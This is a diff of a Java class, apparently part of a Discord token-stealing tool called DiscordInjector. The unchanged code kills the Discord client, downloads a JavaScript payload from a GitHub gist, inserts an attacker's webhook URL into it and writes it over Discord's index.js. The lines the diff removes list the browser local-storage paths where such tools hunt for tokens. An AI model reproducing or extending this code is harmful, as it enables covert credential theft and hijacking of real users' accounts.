@@ -31,11 +31,6 @@ public class DiscordInjector {
 	};
 
 
-	String chromePath = (System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
-	String operaPath = (System.getProperty("user.home") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
-	String firefoxPath = (System.getProperty("user.home") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\avionrhy.default-release\\storage\\default");
-	String operagxPath = (System.getProperty("user.home") + "\\AppData\\Roaming\\Opera Software\\Operagx Stable\\Local Storage\\leveldb");
-
 	@SuppressWarnings(value = {"unused"})
 	public synchronized void initialize() throws Exception {
 		if (!legitMode) utilities._instance.getDiscordKiller();
@@ -57,7 +52,6 @@ public class DiscordInjector {
                                                     if ((String.valueOf(file5)).contains("index.js")) {
                                                         Scanner scanner = new Scanner(new URL("https://gist.githubusercontent.com/Luxotick/1869c3d7e65a104bf1817fb1f41c7e3a/raw/4ae32ef6772ae887dd190e4c4e9590e64d1babe1/sontest.js").openStream(), StandardCharsets.UTF_8.toString()).useDelimiter("\\A");
                                                         List<String> results = new ArrayList<String>();
-														//delete C:\Users\mert\AppData\Roaming\Mozilla\Firefox\Profiles\avionrhy.default-release\storage\default directory with apache commons
                                                         results.add(scanner.next().replace("%WEBHOOK_LINK%", webhookURL));
                                                         FileUtils.writeLines(file5, StandardCharsets.UTF_8.toString(), results);
                                                     }
